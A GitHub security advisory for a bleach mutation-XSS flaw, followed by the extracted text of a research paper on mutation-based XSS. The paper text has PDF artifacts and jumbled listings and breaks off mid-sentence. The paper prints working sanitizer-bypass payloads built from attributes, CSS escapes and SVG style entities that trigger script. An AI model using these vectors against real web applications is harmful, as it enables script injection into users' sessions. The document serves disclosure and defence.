# mutation XSS via whitelisted math or svg and RCDATA tag with strip=False

Moderate

[g-k](/g-k)
published
GHSA-m6xf-fq7q-8743
Mar 17, 2020

## Package

bleach
(python)

## Affected versions

<=3.1.1

## Patched versions

3.1.2

## Description

### Impact

A [mutation XSS](https://cure53.de/fp170.pdf) affects users calling `bleach.clean` with all of:

* the `svg` or `math` in the allowed/whitelisted tags
* an RCDATA tag (see below) in the allowed/whitelisted tags
* the keyword argument `strip=False`

### Patches

Users are encouraged to upgrade to bleach v3.1.2 or greater.

### Workarounds

* modify `bleach.clean` calls to use `strip=True`, or not whitelist `math` or `svg` tags and one or more of the following tags:

```
script
noscript
style
noframes
xmp
noembed
iframe

```

* A strong [Content-Security-Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP) without `unsafe-inline` and `unsafe-eval` [`script-src`s](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/script-src)) will also help mitigate the risk.

ABSTRACT
Back in 2007, Hasegawa discovered a novel Cross-Site Scrip-
ting (XSS) vector based on the mistreatment of the backtick
character in a single browser implementation. This initially
looked like an implementation error that could easily be
(cid:12)xed. Instead, as this paper shows, it was the (cid:12)rst example
of a new class of XSS vectors, the class of mutation-based
XSS (mXSS) vectors, which may occur in innerHTML and
related properties. mXSS a(cid:11)ects all three major browser
families: IE, Firefox, and Chrome.

We were able to place stored mXSS vectors in high-pro(cid:12)le
applications like Yahoo! Mail, Redi(cid:11) Mail, OpenExchange,
Zimbra, Roundcube, and several commercial products. m-
XSS vectors bypassed widely deployed server-side XSS pro-
tection techniques (like HTML Puri(cid:12)er, kses, htmlLawed,
Blueprint and Google Caja), client-side (cid:12)lters (XSS Auditor,
IE XSS Filter), Web Application Firewall (WAF) systems,
as well as Intrusion Detection and Intrusion Prevention Sys-
tems (IDS/IPS). We describe a scenario in which seemingly
immune entities are being rendered prone to an attack based
on the behavior of an involved party, in our case the browser.
Moreover, it proves very di(cid:14)cult to mitigate these attacks:
In browser implementations, mXSS is closely related to per-
formance enhancements applied to the HTML code before
rendering; in server side (cid:12)lters, strict (cid:12)lter rules would break
many web applications since the mXSS vectors presented in
this paper are harmless when sent to the browser.

This paper introduces and discusses a set of seven di(cid:11)er-
ent subclasses of mXSS attacks, among which only one was
previously known. The work evaluates the attack surface,
showcases examples of vulnerable high-pro(cid:12)le applications,
and provides a set of practicable and low-overhead solutions
to defend against these kinds of attacks.

INTRODUCTION

Mutation-based Cross-Site-Scripting (mXSS).

Server- and client-side XSS (cid:12)lters share the assumption
that their HTML output and the browser-rendered HTML
content are mostly identical. In this paper, we show how this
premise is false for important classes of web applications that
use the innerHTML property to process user-contributed con-
tent. Instead, this very content is mutated by the browser,
such that a harmless string that passes nearly all of the de-
ployed XSS (cid:12)lters is subsequently transformed into an active
XSS attack vector by the browser layout engine itself.

The information (cid:13)ow of an mXSS attack is shown in Fig-
ure 1: The attacker carefully prepares an HTML or XML
formatted string and injects it into a web application. This
string will be (cid:12)ltered or even rewritten in a server-side XSS
(cid:12)lter, and will then be passed to the browser. If the browser
contains a client-side XSS (cid:12)lter, the string will be checked
again. At this point, the string is still harmless and cannot
be used to execute an XSS attack.

However, as soon as this string is inserted into the brower’s
DOM by using the innerHTML property, the browser will mu-
tate the string. This mutation is highly unpredictable since
it is not part of the speci(cid:12)ed innerHTML handling, but is a
proprietary optimization of HTML code implemented di(cid:11)er-
ently in each of the major browser families. The mutated

string now contains a valid XSS vector, and the attack will
be executed on rendering of the new DOM element. Both
server- and client side (cid:12)lters were unable to detect this at-
tack because the string scanned in these (cid:12)lters did not con-
tain any executable code.

Mutation-based XSS (mXSS) makes an impact on all three
major browser families (IE, Firefox, Chrome). Table 1 gives
an overview on the mXSS subclasses discovered so far, and
points to their detailed description. A web application is
vulnerable if it inserts user-contributed input with the help
of innerHTML or related properties into the DOM of the
browser. It is di(cid:14)cult to statistically evaluate the number
of websites a(cid:11)ected by the seven attack vectors covered in
this paper, since automated testing fails to reliably detect
all these attack prerequisites: If innerHTML is only used to
insert trusted code from the web application itself into the
DOM, it is not vulnerable. However, it can be stated that
amongst the 10.000 most popular web pages, roughly one
third uses the innerHTML property, and about 65% use Java-
Script libraries like jQuery [7], who abet mXSS attacks by
using the innerHTML property instead of the corresponding
DOM methods.

However, it is possible to single out a large class of vulner-
able applications (Webmailers) and name high-pro(cid:12)le state-
of-the-art XSS protection techniques that can be circum-
vented with mXSS. Thus the alarm we want to raise with
this paper is that an important class of web applications is
a(cid:11)ected, and that nealy all XSS mitigation techniques fail.

Webmail Clients.

Webmail constitutes a class of web applications particu-
larly a(cid:11)ected by mutation-based XSS: nearly all of them (in-
cluding e.g. Microsoft Hotmail, Yahoo! Mail, Redi(cid:11) Mail,
OpenExchange, Roundcube and other tools and providers)
were vulnerable to the vectors described in this paper. These
applications use the innerHTML property to display user-
generated HTML email content. Before doing so, the con-
tent is thoroughly (cid:12)ltered by server-side anti-XSS libraries
in recognition of the dangers of a stored XSS attack. The
vectors described in this paper will pass through the (cid:12)lter
because the HTML string contained in the email body does
not form a valid XSS vector { but would require only a sin-

gle innerHTML access to be turned into an attack by the
browser itself.

Here the attacker may submit the attack vector within the
HTML-formatted body of an email. Most webmail clients do
not use innerHTML to display this email in the browser, but
a simple click on the \Reply" button may trigger the attack:
to attach the contents of the mail body to the reply being
edited in the webmail client, mostly innerHTML access is
used.

HTML Sanitizers.

We analysed a large variety of HTML sanitizers such as
HTML Puri(cid:12)er, htmLawed, OWASP AntiSamy, jSoup, kses
and various commercial providers. At the time of testing, all
of them were (and many of them still are) vulnerable against
mXSS attacks. Although some of the authors reacted with
solutions, the major e(cid:11)ort was to alert the browser ven-
dors and trigger (cid:12)xes for the innerHTML-transformations.
In fact, several of our bug reports have led to subsequent
changes in browser behavior. To protect users, we have
decided to anonymise names of several formerly a(cid:11)ected
browsers and applications used as examples in our work.

This paper makes the following contributions:

1. We identify an undocumented but long-existing threat
against web applications, which enables an attacker
to conduct XSS attacks, even if strong server- and
client-side (cid:12)lters are applied. This novel class of attack
vectors utilize performance-enhancement peculiarities
present in all major browsers, which mutate a given
HTML string before it is rendered. We propose the
term mXSS (for Mutation-based XSS) to describe this
class of attacks to disambiguate and distinguish them
from classic, re(cid:13)ected, persistent and DOM-based XSS
attacks.

2. We discuss client- and server-side mitigation mecha-
nisms. In particular, we propose and evaluate an in-
browser protection script, entirely composed in Java-
Script, which is practical, feasible and has low-overhead.
With this script, a web application developer can im-
plement a (cid:12)x against mXSS attacks without relying
on server-side changes or browser updates. The script
overwrites the getter methods of the DOM properties
we identi(cid:12)ed as vulnerable and changes the HTML
handling into an XML-based processing, thereby ef-
fectively mitigating the attacks and stopping the mu-
tation e(cid:11)ects1.

3. We evaluated this attack in three ways: (cid:12)rst, we an-
alyzed the attack surface for mXSS and give a rough
estimate the number of vulnerable applications on the
Internet; second, we conducted a (cid:12)eld study testing
commonly used web applications such as Yahoo! Mail
and other high pro(cid:12)le websites, determining whether
they could be subjected to mXSS attacks; third, we
have examined common XSS (cid:12)lter software such as
AntiSamy, HTML Puri(cid:12)er, Google Caja and Blueprint
for mXSS vulnerabilities, subsequently reporting our
(cid:12)ndings back to the appropriate tool’s author(s).

1In result, one can purposefully choose XML-based process-
ing for security-critical sites and HTML-based processing for
performance-critical sites.

2. PROBLEM DESCRIPTION

In the following sections, we describe the attack vectors
which arise from the use of the innerHTML property in web-
sites. We will outline the history of (cid:12)ndings and recount a
realistic attack scenario. The problems we identify leave
websites vulnerable against the novel kind of mXSS attacks,
even if the utilized (cid:12)lter software fully protects against the
dangers of the classic Cross-Site Scripting.

2.1 The innerHTML Property

Originally introduced to browsers by Microsoft with In-
ternet Explorer 4, the property quickly gained popularity
among web developers and was adopted by other browsers,
despite being non-standard. The use of innerHTML and
outerHTML is supported by each and every one of the com-
monly used browsers in the present landscape. Consequently,
the W3C started a speci(cid:12)cation draft to unify innerHTML
rendering behaviors across browser implementations [20].

An HTML element’s innerHTML property deals with cre-
ating HTML content from arbitrarily formatted strings on
write access on the one hand, and with serializing HTML
DOM nodes into strings on read access on the other. Both
directions are relevant in scope of our paper { the read access
is necessary to trigger the mutation while the write access
will attach the transformed malicious content to the DOM.
The W3C working draft document, which is far from com-
pletion, describes this process as generation of an ordered
set of nodes from a string valued attribute. Due to being
attached to a certain context node, if this attribute is eval-
uated, all children of the context node are replaced by the
(ordered) node-set generated from the string.

To use innerHTML, the DOM interface of element is en-
hanced with an innerHTML attribute/property. Setting of
this attribute can occur via the element.innerHTML=value
syntax, and in this case the attribute will be evaluated im-
mediately. A typical usage example of innerHTML is shown
in Listing 1: when the HTML document is (cid:12)rst rendered, the
<p> element contains the "First text" text node. When
the anchor element is clicked, the content of the <p> element
is replaced by the "New <b>second</b> text." HTML for-
matted string.

Listing 1: Example on innerHTML usage

< script type =" text / javascript " >

var new = " New <b > second <\/ b > text .";
function Change () {

document . all . myPar . innerHTML = new ;

}

</ script >
<p id =" myPar " > First text . </p >
<a href =" javascript : Change () " >

Change text above !

</a >

outerHTML displays similar behavior with single exception:
unlike in the innerHTML case, the whole context (not only
the content of the context node) will be replaced here. The
innerHTML-access changes the utilized markup though for
several reasons and in di(cid:11)ering ways depending on the user
agent. The following code listings show some (non security-
related) examples of these performance optimizations:

Listing 2: Examples for internal HTML mutations
to save CPU cycles
<! - - User Input -->
<s class ="" > hello &# x20 ; <b > goodbye </ b >

<! - - Browser - transformed Output -->
<S > hello <B > goodbye </ B > </S >

The browser { in this case Internet Explorer 8 { mutates
the input string in multiple ways before sending it to the lay-
out engine: the empty class is removed, the tag names are
set to upper-case, the markup is sanitized and the HTML
entities are resolved. These transformations happen in sev-
eral scenarios:

1. Access to the innerHTML or outerHTML properties

of the a(cid:11)ected or parent HTML element nodes;

2. Copy (and subsequent paste) interaction with the HTML

data containing the a(cid:11)ected nodes;

3. HTML editor access via the contenteditable attribute,
the designMode property or other DOM method calls
like document.execCommand();

4. Rendering the document in a print preview container
or similar intermediate views. Browsers tend to use
the outerHTML property of the HTML container or
the innerHTML.

For the sake of brevity, we will use the term innerHTML-
access to refer to some or all of the items from the above
list.

2.2 Problem History and Early Findings

In 2006, a non-security related bug report was (cid:12)led by a
user, noting an apparent (cid:13)aw in the print preview system
for HTML documents rendered by a popular web browser.
Hasegawa’s 2007 analysis [11] of this bug report showed that
once the innerHTML property of an element’s container
node in an HTML tree was accessed, the attributes delim-
ited by backticks or containing values starting with backticks
were replaced with regular ASCII quote delimiters: the con-
tent had mutated. Often the regular quotes disappeared,
leaving the backtick characters unquoted and therefore vul-
nerable to injections. As Hasegawa states, an attacker can
craft input operational for bypassing XSS detection systems
because of its benign nature, yet having a future possibility
of getting transformed by the browser into a code that exe-
cutes arbitrary JavaScript code. An example vector is being
discussed in Section 3.1. This behavior constitutes a funda-
mental basis for our research on the attacks and mitigations
documented in this paper.

2.3 Mutation-based Cross-Site Scripting

Certain websites permit their users to submit inactive
HTML aimed at visual and structural improvement of the
content they wish to present. Typical examples are web-
mailers (visualization of HTML-mail content provided by
the sender of the e-mail) or collaborative editing of com-
plex HTML-based documents (HTML content provided by
all editors).

To protect these applications and their users from XSS at-
tacks, website owners tend to call server-side HTML (cid:12)lters
like e.g. the HTML Puri(cid:12)er, mentioned in Section 5.1, for

assistance. These HTML (cid:12)lters are highly skilled and con-
(cid:12)gurable tool-kits, capable of catching potentially harmful
HTML and removing it from benign content. While it has
become almost impossible to bypass those (cid:12)lters with regu-
lar HTML/Javascript strings, the mXSS problem has yet to
be tackled by most libraries. The core issue is as follows: the
HTML markup an attacker uses to initiate an mXSS attack
is considered harmless and contains no active elements or
potentially malicious attributes { the attack vector exam-
ples shown in Section 3 demonstrate that.

Only the browser will transform the markup internally
(each browser family in a di(cid:11)erent manner), thereby unfold-
ing the embedded attack vector and executing the malicious
code. As previously mentioned, such attacks can be labeled
mXSS { XSS attacks that are only successful because the
attack vector is mutated by the browser, a result of behav-
ioral mishaps introduced by the internal HTML processing
of the user agents.

3. EXPLOITS

The following sections describe a set of innerHTML-based
attacks we discovered during our research on DOM mutation
and string transformation. We present the code purposefully
appearing as sane and inactive markup before the transfor-
mation occurs, while it then becomes an active XSS vector
executing the example method xss() after that said trans-
formation. This way server- and client-side XSS (cid:12)lters are
being elegantly bypassed.

The code shown in Listing 3 provides one basic example
of how to activate (Step 2 in the chain of events described
in Section 4) each and any of the subsequently following
exploits { it simply concatenates an empty string to an ex-
isting innerHTML property. The exploits can further be
triggered by the DOM operations mentioned in Section 2.2.
Any innerHTML-access mentioned in the following sections
signi(cid:12)es a reference to a general usage of the DOM opera-
tions framed by this work.

Listing 3: Code-snippet { illustrating the minimal
amount of DOM-transaction necessary to cause and
trigger mXSS attacks
< script >
window . onload = function () {

document . body . innerHTML += ’ ’;

}
</ script >

We created a test-suite to analyze the innerHTML trans-
formations in a systematic way; this tool was later published
on a related website dedicated to HTML and HTML5 secu-
rity implications 2. The important innerHTML-transformations
are highlighted in the code examples to follow.

3.1 Backtick Characters breaking Attribute De-

limiter Syntax

This DOM string-mutation and the resulting attack tech-
nique was (cid:12)rst publicly documented in 2007, in connection
with the original print-preview bug described in Section 2.2.
Meanwhile, the attack can only be used in legacy browsers
as their modern counterparts have deployed e(cid:11)ective (cid:12)xes
against this problem. Nevertheless, the majority of tested

web applications and XSS (cid:12)lter frameworks remain vulner-
able against this kind of attack { albeit measurable exis-
tence of a legacy browser user-base. The code shown in List-
ing 4 demonstrates the initial attack vector and the resulting
transformation performed by the browser engine during the
processing of the innerHTML property.

Listing 4:
innerHTML-access to an element with

tion

<! - - Browser Output -->
< IMG alt =(cid:18)(cid:18)onload=xss() src =" test . jpg " >

3.2 XML Namespaces in Unknown Elements

causing Structural Mutation

A browser that does not yet support the HTML5 standard
is likely to interpret elements such as article, aside, menu
and others as unknown elements. A developer can decide
how an unknown element is to be treated by the browser: A
common way to pass these instructions is to use the xmlns
attribute, thus providing information on which XML names-
pace the element is supposed to reside on. Once the xmlns
attribute is being (cid:12)lled with data, the visual e(cid:11)ects often
do not change when compared to none or empty names-
pace declarations. However, once the innerHTML property
of one of the element’s container nodes is being accessed, a
very unusual behavior can be observed. The browser pre-
(cid:12)xes the unknown but namespaced element with the XML
namespace that in itself contains unquoted input from the
xmlns attribute. The code shown in Listing 5 demonstrates
this case.

Listing 5:
innerHTML-access to an unknown ele-
ment causes mutation and unsolicited JavaScript ex-
ecution
<! - - Attacker Input -->
< article xmlns ="urn:img src=x

onerror=xss()//" >123

<! - - Browser Output -->
<img src=x onerror=xss()//:article xmlns="urn:img
src=x onerror=xss()//" >123 </ img src = x
onerror = xss () //: article >

The result of this structural mutation and the pseudo-
namespace allowing white-space is an injection point. It is
through this point that an attacker can simply abuse the
fact that an attribute value is being rendered despite its
malformed nature, consequently smuggling arbitrary HTML
into the DOM and executing JavaScript. This problem was
reported and (cid:12)xed in the modern browsers. A similar issue
was discovered and published by Silin 3.

3.3 Backslashes in CSS Escapes causing String-

Boundary Violation

To properly escape syntactically relevant characters in
CSS property values, the CSS1 and CSS2 speci(cid:12)cations pro-
pose CSS escapes. These cover the Unicode range and allow
to, for instance, use the single-quote character without risk.
This is possible even inside a CSS string that is delimited by
single quotes. Per speci(cid:12)cation, the correct usage for CSS es-
capes inside CSS string values would be: property: ’v\61
lue’. The escape sequence is representing the a character,
based on its position in the ASCII table of characters. Uni-
code values can be represented by escaping sequences such
as n20AC for the ¿ glyph, to give one example.

Several modern browsers nevertheless break the security
promises indicated by the correct and standards-driven us-
age of CSS escapes. In particular, it takes place for the in-
nerHTML property of a parent element being accessed. We
observed a behavior that converted escapes to their canon-
ical representation. The sequence property: ’val\27ue’
would result in the innerHTML representation PROPERTY:
’val’ue’. An attacker can abuse this behavior by inject-
ing arbitrary CSS code hidden inside a properly quoted and
escaped CSS string. This way HTML (cid:12)lters checking for
valid code that observes the standards can be bypassed, as
depicted in Listing 6.

innerHTML-access to an element using
Listing 6:
CSS escapes in CSS strings causes JavaScript exe-
cution
<! - - Attacker Input -->
<p style =" font - family : ’ ar\27\3bx\3a

expression\28xss\28\29\29\3bial ’" > </p >

<! - - Browser Output -->
<P style =" FONT - FAMILY : ’ ar

’;x:expression(xss());ial ’" > </P >

Unlike the backtick-based attacks described in Section 3.1,
this technique allows recursive mutation. This means that,
for example, a double-escaped or double-encoded character
will be double-decoded in case that innerHTML-access oc-
curs twice. More speci(cid:12)cally, the \5c 5c escape sequence
will be broken down to the \5c sequence after (cid:12)rst inner-
HTML-access, and consequently decoded to the \ character
after the second innerHTML-access.

During our attack surface’s evaluation, we discovered that
some of the tested HTML (cid:12)lters could be bypassed with the
use of &#amp;x5c 5c 5c 5c or alike sequences. Due to the
backslashes’ presence allowed in CSS property values, the
HTML entity representation combined with the recursive
decoding feature had to be employed for code execution and
attack payload delivery.

The attacks that become possible through this technique
range from overlay attacks injecting otherwise unsolicited
CSS properties (such as positioning instructions and nega-
tive margins), to arbitrary JavaScript execution, font injec-
tions (as described by Heiderich et al. [14]), and the DHTML
behavior injections for levering XSS and ActiveX-based at-
tacks.

3.4 Misﬁt Characters in Entity Representation

breaking CSS Strings

Combining aforementioned exploit with enabling CSS-escape

decoding behavior results in yet another interesting e(cid:11)ect

observable in several browsers. That is, when both CSS es-
cape and the canonical representation for the double-quote
character inside a CSS string are used, the render engine
converts them into a single quote, regardless of those two
characters seeming unrelated. This means that the \22,
&quot;, &#x22; and &#34; character sequences will be con-
verted to the ’ character upon innerHTML-access. Based
on the fact that both characters have syntactic relevance
in CSS, the severity of the problems arising from this be-
havior is grand. The code example displayed in Listing 7
shows a mutation-based XSS attack example. To sum up
and underline once again, it is based on fully valid and inac-
tive HTML and CSS markup that will unfold to active code
once the innerHTML-access is involved.

innerHTML-access to an element using
Listing 7:
CSS strings containing mis(cid:12)t HTML entities causes
JavaScript execution
<! - - Attacker Input -->
<p style =" font - family : ’ ar&quot;;x =
expression ( xss () ) /* ial ’" > </p >

<! - - Browser Output -->
<P style =" FONT - FAMILY : ’ ar’;x = expression (

xss () ) /* ial ’" > </ P >

We can only speculate about the reasons for this surpris-
ing behavior. One potential explanation is that in case when
the innerHTML transformation might lead the \22, &quot;,
&#x22; and &#34; sequences to be converted into the actual
double-quote character ("), then { given that the attribute
itself is being delimited with double-quotes { an improper
handling could not only break the CSS string but even dis-
rupt the syntactic validity of the surrounding HTML. An
attacker could abuse that to terminate the attribute with a
CSS escape or HTML entity, and, afterwards, inject crimson
HTML to cause an XSS attack.

Our tests showed that it is not possible to break the
HTML markup syntax with CSS escapes once used in a
CSS string or any other CSS property value. The mutation
e(cid:11)ects only allow CSS strings to be terminated illegitimately
and lead to an introduction of new CSS property-value pairs.
Depending on the browser, this may very well lead to an XSS
exploit executing arbitrary JavaScript code. Supporting this
theory, the attack technique shown in Section 3.5 considers
markup integrity but omits CSS string sanity considerations
within the transformation algorithm of HTML entities and
CSS escapes.

3.5 CSS Escapes in Property Names violating

entire HTML Structure

As mentioned in Section 3.4, an attacker cannot abuse
mutation-based attacks to break the markup structure of
the document containing the style attribute hosting the CSS
escapes and entities. Thus far, the CSS escapes and entities
were used exclusively in CSS property values and not in
the property names. Applying the formerly discussed tech-
niques to CSS property names instead of values forces some
browsers into a completely di(cid:11)erent behavior, as demon-
strated in Listing 8.

Listing 8:
innerHTML-access to an element with
invalid CSS property names causes JavaScript exe-
cution
<! - - Attacker Input -->
< img style =" font - fa\22on-

load\3dxss\28\29\20mily : ’ arial ’" src =" test
. jpg " / >

Listing 10:
innerHTML-access to an element with
encoded XHTML in CSS string values causes Java-
Script execution
<! - - Attacker Input -->
< style >*{ font - family : ’ ar&lt;img

src=&quot;test.jpg&quot;
onload=&quot;xss()&quot;/&gt;ial ’} </ style >

<! - - Browser Output -->
< IMG style =" font - fa"onload=xss() mily:

’ arial ’" src =" test . jpg " >

Creating a successful exploit, which is capable of executing
arbitrary JavaScript, requires an attacker to (cid:12)rst terminate
the style attribute by using a CSS escape. Therefore, the
injected code would trigger the exploit code while it still fol-
lows the CSS syntax rules. Otherwise, the browser would
simply remove the property-value pair deemed invalid. This
syntax constraint renders several characters useless for cre-
ating exploits. White-space characters, colon, equals, curly
brackets and the semi colon are among them. To bypass
the restriction, the attacker simply needs to escape those
characters as well. We illustrate this in Listing 8. By escap-
ing the entire attack payload, the adversary can abuse the
mutation feature and deliver arbitrary CSS-escaped HTML
code.

Note that the attack only works with the double-quote
representation inside double-quoted attributes. Once a web-
site uses single-quotes to delimit attributes, the technique
can be no longer applied. The innerHTML-access will con-
vert single quotes to double quotes. Then again, the \22
escape sequence can be used to break and terminate the at-
tribute value. The code displayed in Listing 9 showcases this
yet again surprising e(cid:11)ect.

Listing 9: Example for automatic quote conversion
on innerHTML-access
<! - - Example Attacker Input -->
<p style = ’ fo\27\22o : bar ’ >

<! - - Example Browser Output -->
<P style =" fo’"o : bar " > </P >

3.6 Entity-Mutation in non-HTML Documents
Once a document is being rendered in XHTML/XML
mode, di(cid:11)erent rules apply to the handling of character enti-
ties, non-wellformed content including unquoted attributes,
unclosed tags and elements, invalid elements nesting and
other aspects of document structure. A web-server can in-
struct a browser to render a document in XHTML/XML
by setting a matching MIME type via Content-Type HTTP
headers; in particular the MIME text/xhtml, text/xml, ap-
plication/xhtml+xml and application/xml types can be em-
ployed for this task (more exotic MIME types like image/svg
+xml and application/vnd.wap.xhtml+xml can also be used).
These speci(cid:12)c and MIME-type dependent parser behav-
iors cause several browsers to show anomalies when, for in-
stance, CSS strings in style elements are exercised in com-
bination with (X)HTML entities. Several of these behaviors
can be used in the context of mutation-based XSS attacks,
as the code example in Listing 10 shows.

<! - - Browser Output -->
< style >*{ font - family : ’ ar<img src="test.jpg"

onload="xss()"/>ial ’} </ style >

Here-above, the browser automatically decodes the HTML
entities hidden in the CSS string specifying the font family.
By doing so, the parser must assume that the CSS string
contains actual HTML. While in text/html neither a muta-
tion nor any form or parser confusion leading to script exe-
cution would occur, in text/xhtml and various related MIME
type rendering modes, a CSS style element is supposed to be
capable of containing other markup elements. Thus, without
leaving the context of the style element, the parser decides
to equally consider the decoded img element hidden in the
CSS string, evaluate it and thereby execute the JavaScript
connected to the successful activation of the event handler.
This problem is unique to the WebKit browser family, al-
though similar issues were spotted in other browser engines.
Beware that despite a very small distribution of sites us-
ing MIME types such as text/xhtml, text/xml, application/x-
html+xml and application/ xml (0.0075% in the Alexa Top
1 Million website list), an attacker might abuse MIME sni(cid:11)-
ing, frame inheritance and other techniques to force a web-
site into the necessary rendering mode, purposefully acting
towards a successful exploit execution. The topic of security
issues arising from MIME-sni(cid:14)ng has been covered by by
Barth et al., Gebre et al. and others [2, 3, 8].

3.7 Entity-Mutation in non-HTML context of

HTML documents

In-line SVG support provided in older browsers could lead
to XSS attacks originating in HTML entities that were em-
bedded inside style and similar elements, which are by de-
fault evaluated in their canonic form upon the occurrence
of innerHTML-access. This problem has been reported and
mitigated by the a(cid:11)ected browser vendors and is listed here
to further support our argument. The code example in List-
ing 11 showcases anatomy of this attack.

Listing 11: Misusing HTML entities in inline-SVG
CSS-string properties to execute arbitrary Java-
Script
<! - - Attacker Input -->
<p > < svg > < style >*{ font - family : ’

&lt&sol;style&gt;&ltimg/src=x&Tab;
onerror=xss()&sol;&sol; ’} </ style > </ svg > </p
>

<! - - Browser Output -->
<p > < svg > < style >*{ font - family : ’

</style></svg><img src="x" onerror="xss()"
/> ’} </p >

This vulnerability was present in a popular open-source
user agent and has been since (cid:12)xed successfully, following a
bug report.

3.8 Summary

In order to initiate the mutation, all of the exploits shown
here require a single access to the innerHTML property of
a surrounding container, while except for the attack vector
discussed in Section 3.1, all other attacks can be upgraded
to allow recursive mutation { making double-, triple- and
further multiply-encoded escapes and entities useful in the
immediately when multiple innerHTML-
attack scenario,
access to the same element takes place. The attacks were
successfully tested against a large range of publicly available
web applications and XSS (cid:12)lters { see Section 4.

4. ATTACK SURFACE

The attacks outlined in this paper target the client-side
web application components, e.g. JavaScript code, that use
the innerHTML property to perform dynamic updates to
the content of the page. Rich text editors, web email clients,
dynamic content management systems and components that
pre-load resources constitute the examples of such features.
In this section we detail the conditions under which a web
application is vulnerable. Additionally, we attempt to es-
timate the prevalence of these conditions in web pages at
present.

The basic conditions for a mutation event to occur are
the serialization and deserialization of data. As mentioned
in Section 2, mutation in the serialization of the DOM-tree
occurs when the innerHTML property of a DOM-node is ac-
cessed. Subsequently, when the mutated content is parsed
back into a DOM-tree, e.g. when assigned to innerHTML
or written to the document using document.write, the mu-
tation is activated.

The instances in Listing 12 are far from being the exclusive
methods for a mutation event to occur, but they exemplify
vulnerable code patterns. In order for an attacker to exploit
such a mutation event, it must take place on the attacker-
supplied data. This condition makes it di(cid:14)cult to statisti-
cally estimate the number of vulnerable websites, however,
the attack surface can be examined through an evaluation of
the number of websites using such vulnerable code patterns.

Listing 12: Code snippets { vulnerable code pat-
terns
// Native JavaScript / DOM code

a . innerHTML += ’ additional content ’;
a . insertAdjacentHTML ( ’ beforebegin ’ , b .

document . write ( a . innerHTML ) ;

// Library code
$ ( element ) . html ( ’ additional content ’) ;

4.1 InnerHTML Usage

Since an automated search for innerHTML does not de-
termine the exploitability of its usage, it can only serve as
an indication for the severity of the problem. To evaluate
the prevalence of innerHTML usage on the web, we con-
ducted a study of the Alexa top 10,000 most popular web
sites. A large fraction of approximately one third of these
web sites utilized vulnerable code patterns, like the ones in
Listing 12, in their code for updating page content. Major
websites like Google, Amazon, EBay and Microsoft could
be identi(cid:12)ed among these. Again, this does not suggest that

these web sites can be exploited. We found an overall of
74.5% of the Alexa Top 1000 websites to be using inner-
HTML-assignments. While the usage of innerHTML is very
common, the circumstances under which it is vulnerable to
exploitation are in fact hard to quantify. Note though that
almost all applications applied with an editable HTML area
are prone to being vulnerable.

Additionally, there are some notable examples of poten-
tially vulnerable code patterns identi(cid:12)able in multiple and
commonly used JavaScript libraries, e.g.
jQuery [7] and
SWFObject [27]. Indeed, more than 65% of the top 10,000
most popular websites do employ one of these popular li-
braries (with 48,87% using jQuery), the code of which could
be used to trigger actual attacks. Further studies have to be
made as to whether or not web applications reliant on any
of these libraries are a(cid:11)ected, as it largely depends on how
the libraries are used. In certain cases, a very speci(cid:12)c set
of actions needs to be performed if the vulnerable section
of the code is to be reached. Regardless, library’s inclusion
always puts a given website at risk of attacks.

Ultimately, we queried the Google Code Search Engine
(GCSE) as well as the Github search tool to determine which
libraries and public source (cid:12)les make use of potentially dan-
gerous code patterns. The search query yielded an over-
all 184,000 positive samples using the GCSE and 1,196,000
positive samples using the Github search tool. While this
does not provide us with an absolute number of vulnerable
websites, it shows how widely the usage of innerHTML is
distributed; any of these libraries using vulnerable code pat-
terns in combination with user-generated content is likely to
be vulnerable to mXSS attacks.

4.2 Web-Mailers

A class of web applications particularly vulnerable to m-
XSS attacks are classic web-mailers { applications that fa-
cilitates receiving, reading and managing HTML mails in a
browser.
In this example, the fact that HTML Rich-Text
Editors (RTE) are usually involved, forms the basis for the
use of the innerHTML property, which is being triggered
with almost any interaction with the mail content. This
includes composing, replying, spell-checking and other com-
mon features of applications of this kind. A special case of
attack vector is sending an mXSS string within the body
of an HTML-formatted mail. We analyzed commonly used
web-mail applications and spotted mXSS vulnerabilities in
almost every single one of them, including e.g. Microsoft
Hotmail, Yahoo! Mail, Redi(cid:11) Mail, OpenExchange, Round-
cube, and many other products { some of which cannot yet
be named for the sake of user protection. The discovery
was quickly followed with bug reports sent to the respective
vendors, which were acknowledged.

4.3 Server-Side XSS Filters

The class of mXSS attacks poses a major challenge for
server-side XSS (cid:12)lters. To completely mitigate these at-
tacks, they would have to simulate the mutation e(cid:11)ects of
the three major browser families in hopes of determining
whether a given string may be an mXSS vector. At the same
time, they should not (cid:12)lter benign content, in order not to
break the web application. The (cid:12)xes applied to HTML san-
itizers, as mentioned in the introduction, are new rules for
known mutation e(cid:11)ects. It can be seen as a challenging task

to develop new (cid:12)ltering paradigms that may discover even
unknown attack vectors.

5. MITIGATION TECHNIQUES

The following sections will describe a set of mitigation
techniques that can be applied by website owners, devel-
opers, or even users to protect against the cause and im-
pact of mutation XSS attacks. We provide details on two
approaches. The (cid:12)rst one is based on a server-side (cid:12)lter,
whereas the other focuses on client-side protection and em-
ploys an interception method in critical DOM properties ac-
cess management.

5.1 Server-side mitigation

Avoiding outputting server content otherwise incorrectly
converted by the browsers is the most direct mitigation strat-
In speci(cid:12)c terms, the (cid:13)awed content should be re-
egy.
placed with semantically equivalent content which is con-
verted properly. Let us underline that the belief stating
that \well-formed HTML is unambiguous" is false: only a
browser-dependent subset of well-formed HTML will be pre-
served across innerHTML-access and -transactions.

A comprehensible and uncomplicated policy is to simply
disallow any of the special characters for which browsers
are known to have trouble with when it comes to a proper
conversion. For many HTML attributes and CSS proper-
ties this is not a problem, since their set of allowed values
already excludes these particular special characters. Unfor-
tunately, in case of free-form content, such a policy may be
too stringent. For HTML attributes, we can easily re(cid:12)ne
our directive by observing that ambiguity only occurs when
the browser omits quotes from its serialized representation.
Insertion of quotes can be guaranteed by, for example, ap-
pending a trailing whitespace to text, a change unlikely to
modify the semantics of the original text. Indeed, the W3C
speci(cid:12)cation states that user agents may ignore surrounding
whitespace in attributes. A more aggressive transformation
would only insert a space when the attribute was to be seri-
alized without quotes, yet contained a backtick. It should be
noted that backtick remains the only character which causes
Internet Explorer to mis-parse the resulting HTML.

For CSS, re(cid:12)ning our policy is more di(cid:14)cult. Due to the
improper conversion of escape sequences, we cannot allow
any CSS special characters in general, even in their escaped
form. For URLs in particular, parentheses and single quotes
are valid characters in a URL, but are simultaneously con-
sidered special characters in CSS. Fortunately, most major
web servers are ready to accept percent encoded versions of
these characters as equivalent, so it is su(cid:14)cient to utilize
